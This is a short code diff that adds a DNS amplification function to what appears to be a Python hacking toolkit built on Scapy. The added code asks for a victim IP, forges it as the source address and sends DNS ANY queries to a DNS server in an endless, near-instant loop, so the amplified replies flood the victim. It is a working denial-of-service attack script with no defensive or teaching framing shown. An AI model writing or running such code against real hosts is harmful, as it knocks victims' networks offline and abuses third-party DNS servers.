@@ -8,6 +8,20 @@ from tqdm import tqdm
 #from netfilterqueue import NetfilterQueue
 import requests
 
+def dns_amplification():
+    
+        print("Insert the target IP address: ")
+        target = input()
+    
+        dns = "198.162.222.1" #DNS server
+    
+        try:
+            while True:
+                packet = IP(src=target, dst=dns) / UDP(sport=RandShort(), dport=53) / DNS(rd=1, qd=DNSQR(qname="google.com", qtype=255))
+                send(packet, loop=1, inter=0.000001)
+        except KeyboardInterrupt as e:
+            sys.exit(1)
+
 def os_detection():
     print("Insert target IP address: ")
     target = input()
